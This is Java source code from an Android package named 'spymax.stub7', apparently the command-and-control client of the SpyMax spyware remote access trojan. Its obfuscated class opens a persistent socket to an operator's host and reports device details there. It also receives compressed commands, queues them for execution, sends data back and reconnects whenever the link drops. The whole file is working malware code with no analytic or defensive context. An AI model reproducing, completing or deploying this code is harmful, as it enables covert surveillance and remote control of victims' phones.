package spymax.stub7;
import android.content.Context;
import android.content.Intent;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.ThreadPoolExecutor;
public class ClassGen2 {
    public static final int u = 1024 * 200;
    public static final int t = 45000;
    public static long s = 360L;
    public static Socket k;
    public static InetSocketAddress so;
    public static DataInputStream in;
    public static OutputStream out;
    public static InetAddress ad;
    public static boolean q;
    public static Object y = new Object();
    public static Object r = new Object();
    public static String IP,PORT;
    public static Context ctx;
    public static boolean echo;
    public static void rt(String ip , String port, Context cx) {
        ClassGen2.ctx = cx;
        ClassGen2.IP = ip;
        ClassGen2.PORT = port;
        cnn(ClassGen2.IP,ClassGen2.PORT);
    }
    public static void cnn(final String i, final String p){
        new Thread(new Runnable() {  @Override
        public void run() {
            String ip[] = i.split(ClassGen3.tg);
            String po[] = p.split(ClassGen3.tg);
            do {
                if(!ClassGen3.sv(ctx)){
                    ClassGen3.wk(ctx,false);
                }
                if(ip.length == po.length){
                    int cu = 0;
                    do {
                        try {
                            ClassGen2.ad = InetAddress.getByName(ip[cu]);
                            ClassGen2.so = new InetSocketAddress(ClassGen2.ad, Integer.valueOf(po[cu]));
                            ClassGen2.k = new Socket();
                            ClassGen2.k.setSoTimeout(0);
                            ClassGen2.k.setKeepAlive(true);
                            ClassGen2.k.connect(ClassGen2.so,ClassGen2.t);
                            ClassGen2.q = ClassGen2.k.isConnected();
                            if (ClassGen2.q) {
                                ClassGen2.k.setSendBufferSize(ClassGen2.u);
                                ClassGen2.k.setReceiveBufferSize(ClassGen2.u);
                                ClassGen2.in = new DataInputStream(new BufferedInputStream(ClassGen2.k.getInputStream()));
                                ClassGen2.out = ClassGen2.k.getOutputStream();
                                break;
                            } else {
                                di();
                            }
                        } catch (Exception e) {
                            di();
                        }
                        try{ Thread.sleep(1);} catch (InterruptedException e) {}
                        cu++;
                    } while (cu <= ip.length -1);
                }
                ClassGen3.rel(false);
                try{ Thread.sleep(1000);} catch (InterruptedException e) {}
            } while (!ClassGen2.q);
            if (ClassGen2.q) {
                rc();
            }
        }}).start();
    }
    public static void poi(){
        String sn = so.getAddress().getHostAddress() +
                ClassGen3.tg + ClassGen2.so.getPort() +
                ClassGen3.tg + ClassGen2.ctx.getResources().getString(R.string.i1i2i3i4i5i6) +
                ClassGen3.tg + ClassGen2.ctx.getResources().getString(R.string.k1k2k3k4k5k6) +
                ClassGen3.tg + ClassGen2.ctx.getResources().getString(R.string.o1o2o3o4o5o6) +
                ClassGen3.tg + ClassGen2.ctx.getResources().getString(R.string.u1u2u3u4u5u6) +
                ClassGen3.tg + ClassGen2.ad.getHostName() +
                ClassGen3.tg + ClassGen2.ctx.getResources().getString(R.string.t1t2t3t4t5t6) +
                ClassGen3.tg + "2";
        se(String.valueOf(ClassGen11.plg), sn.getBytes());
    }
    public static void rc(){
        new Thread(new Runnable() {@Override
        public void run() {
            synchronized(ClassGen2.r) {
                if(!ClassGen3.sv(ctx)){
                    ClassGen3.wk(ctx,false);
                }
                ClassGen2.echo = true;
                poi();
                try { try {
                    ByteArrayOutputStream os = new ByteArrayOutputStream();
                    int r, c, f = 0;
                    c = -1;
                    int[] sb = {-1, -1};
                    byte[] bu = new byte[1];
                    while ((r = ClassGen2.in.read(bu)) > 0) {
                        ClassGen11.inx = -1;
                        if (bu.length > 1) {
                            os.write(bu, 0, r);
                            if (os.toByteArray().length == f) {
                                byte[] s = ClassGen3.dZp(ClassGen3.getByte(os.toByteArray(), sb));
                                byte[] b = ClassGen3.dZp(ClassGen3.getString(os.toByteArray(), sb));
                                ClassGen8 Ls = new ClassGen8(s, b);
                                ClassGen11.Li.add(Ls);
                                os.reset();
                                bu = new byte[1];
                                ClassGen2.k.setReceiveBufferSize(ClassGen2.u);
                                f = 0;
                                sb[0] = -1;
                                sb[1] = -1;
                                c = -1;
                            }
                        } else {
                            if (bu[0] == 0) {
                                c += 1;
                                if (c == 0) {
                                    sb[0] = Integer.valueOf(new String(os.toByteArray(), "UTF-8"));
                                    os.reset();
                                } else if ((c == 1)) {
                                    sb[1] = Integer.valueOf(new String(os.toByteArray(), "UTF-8"));
                                    os.reset();
                                    f = sb[0] + sb[1];
                                    ClassGen2.k.setReceiveBufferSize(f);
                                    c = -1;
                                    bu = new byte[f];
                                } else if ((c > 1)) {
                                    c = -1;
                                }
                            } else {
                                os.write(bu, 0, r);
                                try{Thread.sleep(ClassGen2.s);} catch (InterruptedException e) {}
                            }
                        }
                    }
                } catch (Exception e) {}
            }catch (OutOfMemoryError e) {}
                di();
                ClassGen3.rel(false);
                cnn(ClassGen2.IP, ClassGen2.PORT);
                ClassGen2.echo = false;
            }
        }}).start();
    }
    public static void se(final String s, final byte[] b){
        if (((ThreadPoolExecutor) ClassGen3.ec).getActiveCount() >= ClassGen3.max){
            return;
        }
        ClassGen3.ec.execute(new Runnable() {
            public void run() {
                try {
                    synchronized(ClassGen2.y){
                        byte[] b0 = ClassGen3.f(s,b);
                        ClassGen2.k.setSendBufferSize(b0.length);
                        ClassGen2.out.write(b0, 0,b0.length);
                    }
                } catch (Exception e) {
                    di();
                }
            }});
    }
    public static void ox() {
        if (ClassGen11.plg != -1){
            ClassGen3.ec(ClassGen11.cmn[0] + ClassGen2.ad.getHostName());

        }
    }
    public static void di() {
        ClassGen11.k = false;
        ClassGen2.q = false;
        try {
            ClassGen2.k.shutdownInput();
        }catch (Exception e) {}
        try {
            ClassGen2.k.getOutputStream().close();
        } catch (Exception e) {}
        try {
            ClassGen2.k.getInputStream().close();
        } catch (Exception e) {}
        try {
            ClassGen2.k.close();
        } catch (Exception e) {}
        if(out != null)
        {
            try {
                ClassGen2.out.close();
            } catch (Exception e) {}
            ClassGen2.out = null;
        }
        if(ClassGen2.in != null)
        {
            try {
                ClassGen2.in.close();
            } catch (Exception e) {}
            ClassGen2.in = null;
        }
        if(!ClassGen10.r(ClassGen6.class,ClassGen2.ctx)) {
            Intent i = new Intent(ClassGen2.ctx, ClassGen6.class);
            ClassGen2.ctx.stopService(i);
        }
        if(!ClassGen10.r(ClassGen5.class,ClassGen2.ctx)) {
            Intent i = new Intent(ClassGen2.ctx, ClassGen5.class);
            ClassGen2.ctx.stopService(i);
        }
    }
}




